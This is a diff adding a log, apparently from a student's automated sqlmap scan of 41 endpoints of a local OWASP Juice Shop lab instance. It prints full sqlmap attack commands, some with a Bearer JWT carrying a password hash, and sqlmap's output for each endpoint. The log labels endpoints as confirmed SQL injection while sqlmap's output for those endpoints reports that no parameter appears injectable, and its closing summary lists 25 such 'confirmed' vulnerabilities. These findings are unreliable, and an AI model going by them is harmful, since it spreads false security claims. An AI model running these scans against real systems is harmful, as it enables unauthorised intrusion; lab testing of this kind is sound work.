eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_memories_get_by_id
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:45 /2026-06-01/
+  
+  [00:21:45] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:45] [INFO] loading tamper module 'space2comment'
+  [00:21:45] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:46] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:46] [INFO] flushing session file
+  [00:21:46] [INFO] testing connection to the target URL
+  [00:21:46] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:21:46] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:46] [WARNING] reflective value(s) found and filtering out
+  [00:21:46] [INFO] testing if the target URL content is stable
+  [00:21:46] [INFO] target URL content is stable
+  [00:21:46] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:46] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:46] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:46] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:47] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:47] [INFO] testing 'Generic inline queries'
+  [00:21:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:47] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:47] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:48] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:48] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:48] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:48] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 82 times
+  
+  [*] ending @ 00:21:48 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[37/41] Testando: api_challenges_list
+  Método:    GET
+  Path:      /api/Challenges
+  Descrição: Listar desafios do Juice Shop
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Challenges"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_challenges_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . ["]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:49 /2026-06-01/
+  
+  [00:21:49] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:49] [INFO] loading tamper module 'space2comment'
+  [00:21:49] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:49] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:49] [INFO] flushing session file
+  [00:21:49] [INFO] testing connection to the target URL
+  [00:21:49] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:49] [INFO] testing if the target URL content is stable
+  [00:21:50] [INFO] target URL content is stable
+  [00:21:50] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:50] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:50] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:50] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:50] [WARNING] reflective value(s) found and filtering out
+  [00:21:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:50] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:50] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:50] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:50] [INFO] testing 'Generic inline queries'
+  [00:21:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:50] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:50] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:51] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:51] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:51] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:51] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:51] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:51] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:21:51 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[38/41] Testando: api_captcha_list
+  Método:    GET
+  Path:      /api/Captchas
+  Descrição: Obter captcha
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Captchas"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_captcha_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  ["]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:52 /2026-06-01/
+  
+  [00:21:52] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:52] [INFO] loading tamper module 'space2comment'
+  [00:21:52] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:52] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:52] [INFO] flushing session file
+  [00:21:52] [INFO] testing connection to the target URL
+  [00:21:52] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:21:52] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:52] [WARNING] reflective value(s) found and filtering out
+  [00:21:52] [INFO] testing if the target URL content is stable
+  [00:21:52] [INFO] target URL content is stable
+  [00:21:52] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:52] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:52] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:52] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:53] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:53] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:53] [INFO] testing 'Generic inline queries'
+  [00:21:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:53] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:53] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:53] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:53] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:53] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:53] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 82 times
+  
+  [*] ending @ 00:21:53 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[39/41] Testando: rest_whoami
+  Método:    GET
+  Path:      /rest/user/whoami
+  Descrição: Obter dados do usuário autenticado
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/rest/user/whoami" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em rest_whoami
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[,]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [(]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:54 /2026-06-01/
+  
+  [00:21:54] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:54] [INFO] loading tamper module 'space2comment'
+  [00:21:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:54] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:54] [INFO] flushing session file
+  [00:21:54] [INFO] testing connection to the target URL
+  [00:21:54] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:54] [INFO] testing if the target URL content is stable
+  [00:21:55] [INFO] target URL content is stable
+  [00:21:55] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:55] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:55] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:55] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:55] [WARNING] reflective value(s) found and filtering out
+  [00:21:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:55] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:55] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:55] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:55] [INFO] testing 'Generic inline queries'
+  [00:21:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:56] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:56] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:56] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:56] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:56] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:56] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:56] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:21:56 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[40/41] Testando: rest_forgot_password
+  Método:    POST
+  Path:      /rest/user/reset-password
+  Descrição: Redefinir senha via pergunta de segurança
+  Auth:      Não
+  Body:      {"email": "admin@juice-sh.op", "answer": "test", "new": "newpassword123", "repeat": "newpassword123"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/rest/user/reset-password" --method=POST --data='{"email": "admin@juice-sh.op", "answer": "test", "new": "newpassword123", "repeat": "newpassword123"}' --headers="Content-Type: application/json"
+
+  [?] Resultado inconclusivo para rest_forgot_password
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [,]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:57 /2026-06-01/
+  
+  [00:21:57] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:57] [INFO] loading tamper module 'space2comment'
+  [00:21:57] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/120.0.0.0 (Edition std-2)' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:57] [INFO] flushing session file
+  [00:21:57] [INFO] testing connection to the target URL
+  [00:21:57] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:21:57] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:57] [INFO] testing if the target URL content is stable
+  [00:21:57] [INFO] target URL content is stable
+  [00:21:57] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:21:57] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:21:57 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[41/41] Testando: rest_change_password
+  Método:    GET
+  Path:      /rest/user/change-password
+  Descrição: Alterar senha (query params)
+  Auth:      Sim (Bearer JWT)
+  Params:    current=admin123&new=admin123&repeat=admin123
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/rest/user/change-password?current=admin123&new=admin123&repeat=admin123" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [?] Resultado inconclusivo para rest_change_password
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:58 /2026-06-01/
+  
+  [00:21:58] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:58] [INFO] loading tamper module 'space2comment'
+  [00:21:58] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:58] [INFO] flushing session file
+  [00:21:58] [INFO] testing connection to the target URL
+  [00:21:58] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
+  [00:21:58] [WARNING] HTTP error codes detected during run:
+  401 (Unauthorized) - 1 times
+  
+  [*] ending @ 00:21:58 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+
+================================================================================
+  RESUMO FINAL - OWASP Juice Shop
+================================================================================
+  Total de endpoints testados:  41
+  Endpoints pulados:            0
+  Vulnerabilidades encontradas: 25
+  Erros durante execução:       0
+
+  ENDPOINTS VULNERÁVEIS:
+    - [GET] /api/Users (api_users_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Users/1 (api_users_get_by_id)
+      -> SQL Injection confirmada
+    - [GET] /api/Products (api_products_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Products/1 (api_products_get_by_id)
+      -> SQL Injection confirmada
+    - [GET] /rest/products/search (rest_search)
+      -> SQL Injection confirmada
+    - [GET] /rest/products/search (rest_search_empty)
+      -> SQL Injection confirmada
+    - [GET] /api/Feedbacks (api_feedbacks_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Feedbacks/1 (api_feedbacks_get_by_id)
+      -> SQL Injection confirmada
+    - [GET] /api/Complaints (api_complaints_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Recycles (api_recycles_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Recycles/1 (api_recycles_get_by_id)
+      -> SQL Injection confirmada
+    - [GET] /api/SecurityQuestions (api_security_questions)
+      -> SQL Injection confirmada
+    - [GET] /rest/basket/1 (rest_basket)
+      -> SQL Injection confirmada
+    - [GET] /rest/basket/999999 (rest_basket_large_id)
+      -> SQL Injection confirmada
+    - [GET] /api/Addresss (api_addresses_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Addresss/1 (api_addresses_get_by_id)
+      -> SQL Injection confirmada
+    - [GET] /api/Cards (api_cards_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Cards/1 (api_cards_get_by_id)
+      -> SQL Injection confirmada
+    - [GET] /api/Quantitys (api_quantitys_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Quantitys/1 (api_quantitys_get_by_id)
+      -> SQL Injection confirmada
+    - [GET] /api/Memories (api_memories_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Memories/1 (api_memories_get_by_id)
+      -> SQL Injection confirmada
+    - [GET] /api/Challenges (api_challenges_list)
+      -> SQL Injection confirmada
+    - [GET] /api/Captchas (api_captcha_list)
+      -> SQL Injection confirmada
+    - [GET] /rest/user/whoami (rest_whoami)
+      -> SQL Injection confirmada
+
+  Log salvo em: C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\resultado_20260601_002031.txt
+  Saídas sqlmap em: C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output
+================================================================================
